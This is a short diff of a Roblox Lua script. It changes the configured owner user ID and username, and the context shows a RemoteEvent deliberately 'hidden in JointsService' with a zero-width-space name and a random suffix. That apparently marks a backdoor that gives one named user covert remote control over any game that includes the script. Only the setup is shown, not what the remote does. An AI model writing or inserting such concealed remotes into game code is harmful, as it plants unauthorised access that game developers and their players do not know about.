@@ -5,8 +5,8 @@ return function()
     local JointsService = game:GetService("JointsService")
 
     -- [[ CONFIGURATION ]]
-    local MY_USER_ID = 12345678 -- *** CHANGE THIS TO YOUR ACTUAL USERID ***
-    local MY_USERNAME = "Shookenblook" -- *** CHANGE THIS TO YOUR USERNAME ***
+    local MY_USER_ID = 10149136525 -- *** CHANGE THIS TO YOUR ACTUAL USERID ***
+    local MY_USERNAME = "TNg5v" -- *** CHANGE THIS TO YOUR USERNAME ***
 
     -- 1. Setup the RemoteEvent (Hidden in JointsService)
     local RemoteName = "\226\128\139Spunch_" .. HttpService:GenerateGUID(false):sub(1,5)
